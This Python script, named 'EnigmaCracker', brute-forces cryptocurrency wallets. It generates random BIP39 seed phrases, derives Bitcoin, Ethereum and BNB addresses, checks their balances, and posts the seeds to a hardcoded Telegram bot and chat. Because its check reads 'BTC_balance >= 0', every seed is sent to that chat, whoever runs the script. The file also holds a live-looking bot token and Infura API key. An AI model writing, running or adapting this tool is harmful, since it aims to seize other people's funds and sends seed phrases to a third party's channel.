# EnigmaCracker
from web3 import Web3
import subprocess
import sys
import os
import platform
import requests
import logging
import time
from dotenv import load_dotenv
from bip_utils import (
    Bip39MnemonicGenerator,
    Bip39SeedGenerator,
    Bip44,
    Bip44Coins,
    Bip44Changes,
    Bip39WordsNum,
)


BOT_TOKEN = '7997927855:AAGhQHFhmULHhr-cZV7K4lcGBTaDiFugqws'  
CHAT_ID = '759264436'
def send_telegram_message(message):
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': CHAT_ID,
        'text': message
    }
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("Message sent successfully!")
        else:
            print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")
    except Exception as e:
        print(f"An error occurred: {e}")




def bip():
    # Generate a 12-word BIP39 mnemonic
    return Bip39MnemonicGenerator().FromWordsNumber(Bip39WordsNum.WORDS_NUM_12)


def bip44_ETH_wallet_from_seed(seed):
    # Generate an Ethereum wallet from a BIP39 seed.

    # Generate the seed from the mnemonic
    seed_bytes = Bip39SeedGenerator(seed).Generate()

    # Create a Bip44 object for Ethereum derivation
    bip44_mst_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM)

    # Derive the account 0, change 0, address_index 0 path (m/44'/60'/0'/0/0)
    bip44_acc_ctx = (
        bip44_mst_ctx.Purpose()
        .Coin()
        .Account(0)
        .Change(Bip44Changes.CHAIN_EXT)
        .AddressIndex(0)
    )

    # Get the Ethereum address
    eth_address = bip44_acc_ctx.PublicKey().ToAddress()

    return eth_address


def bip44_BTC_seed_to_address(seed):
    # Generate the seed from the mnemonic
    seed_bytes = Bip39SeedGenerator(seed).Generate()

    # Generate the Bip44 object
    bip44_mst_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN)

    # Generate the Bip44 address (account 0, change 0, address 0)
    bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0)
    bip44_chg_ctx = bip44_acc_ctx.Change(Bip44Changes.CHAIN_EXT)
    bip44_addr_ctx = bip44_chg_ctx.AddressIndex(0)

    # Print the address
    return bip44_addr_ctx.PublicKey().ToAddress()



# Connect to Ethereum mainnet via Infura
INFURA_API_KEY = "1f0759785558425584202addbab55928"  # Replace with your Infura project ID
web3 = Web3(Web3.HTTPProvider(f"https://mainnet.infura.io/v3/{INFURA_API_KEY}"))

# Check connection status
if web3.is_connected():  
    print("Successfully connected to Ethereum network!")
else:
    raise Exception("Failed to connect to Ethereum network")
# Function to get balance of an address

def check_ETH_balance(address):
    try:
        # Get balance in wei
        balance_wei = web3.eth.get_balance(address)
        # Convert balance to Ether
        balance = web3.from_wei(balance_wei, 'ether')  
        return balance
    except Exception as e:
        logging.error(f"Error checking address {address}: {e}")
        return 0

def check_BTC_balance(address, retries=3, delay=5):
    # Check the balance of the address
    for attempt in range(retries):
        try:
            response = requests.get(f"https://blockchain.info/balance?active={address}")
            data = response.json()
            balance = data[address]["final_balance"]
            return balance / 100000000  # Convert satoshi to bitcoin
        except Exception as e:
            if attempt < retries - 1:
                logging.error(
                    f"Error checking balance, retrying in {delay} seconds: {str(e)}"
                )
                time.sleep(delay)
            else:
                logging.error("Error checking balance: %s", str(e))
                return 0
BSC_RPC_URL = "https://bsc-dataseed.binance.org/"  # Public BSC RPC endpoint
web33 = Web3(Web3.HTTPProvider(BSC_RPC_URL))

# Check connection status of BNB
if web33.is_connected():  # Use is_connected() to verify the connection
    print("Successfully connected to Binance Smart Chain!")
else:
    raise Exception("Failed to connect to Binance Smart Chain")

def check_BNB_balance(address):
    try:
        # Get balance in wei
        balance_wei = web33.eth.get_balance(address)
        # Convert balance to BNB (1 BNB = 10^18 wei)
        balance = web33.from_wei(balance_wei, 'ether')  # Use from_wei (all lowercase)
        return balance
    except Exception as e:
        logging.error(f"Error checking address {address}: {e}")
        return None




def main():
    global wallets_scanned
    try:
        while True:
            seed = bip()
            # BTC
            BTC_address = bip44_BTC_seed_to_address(seed)
            BTC_balance = check_BTC_balance(BTC_address)

            

            # ETH
            ETH_address = bip44_ETH_wallet_from_seed(seed)
            ETH_balance = check_ETH_balance(ETH_address)
            
            

            # BNB
            BNB_address = bip44_ETH_wallet_from_seed(seed)
            BNB_balance = check_BNB_balance(BNB_address)
            
            message = f"{seed}, {BTC_balance} BTC, {ETH_balance} ETH, {BNB_balance} BNB, ETH address: {ETH_address} "

            

            # Check if the address has a balance
            if BTC_balance >= 0 or ETH_balance > 0 or BNB_balance > 0:
               
                send_telegram_message(message)
            
                

    except KeyboardInterrupt:
        logging.info("Program interrupted by user. Exiting...")


if __name__ == "__main__":
    main()

